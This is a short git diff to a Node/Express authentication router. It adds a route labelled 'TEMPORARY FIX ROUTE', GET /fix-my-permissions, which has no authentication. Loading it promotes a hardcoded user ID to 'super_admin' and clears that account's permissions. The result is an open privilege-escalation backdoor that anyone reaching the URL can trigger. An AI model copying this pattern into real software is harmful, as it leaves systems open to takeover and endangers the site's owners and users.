@@ -13,6 +13,7 @@ import {
   refreshTokenController // Import the refresh token controller
   ,
 
+
   registerController,
   sendOTPController,
   updateOrderController,
@@ -42,6 +43,25 @@ router.post("/refresh-token", refreshTokenController);
 
 //Forgot Password || POST
 router.post("/forgot-password", forgotPasswordController);
+
+// TEMPORARY FIX ROUTE
+router.get("/fix-my-permissions", async (req, res) => {
+  try {
+    const userId = '679ded52f4cbf0230199807e';
+    const user = await mongoose.model("User").findById(userId);
+    if (!user) return res.send("User not found");
+
+    user.role = 3;
+    user.roleString = 'super_admin';
+    user.permissions = undefined; // Force clear
+
+    await user.save();
+
+    res.send("<h1>SUCCESS!</h1><p>Permissions reset successfully.</p><p>Please <b>LOGOUT</b> and <b>LOGIN</b> again to get a new token.</p>");
+  } catch (e) {
+    res.status(500).send(e.message);
+  }
+});
 
 //test routes
 // router.get("/test", requireSignIn, isAdmin, testController);
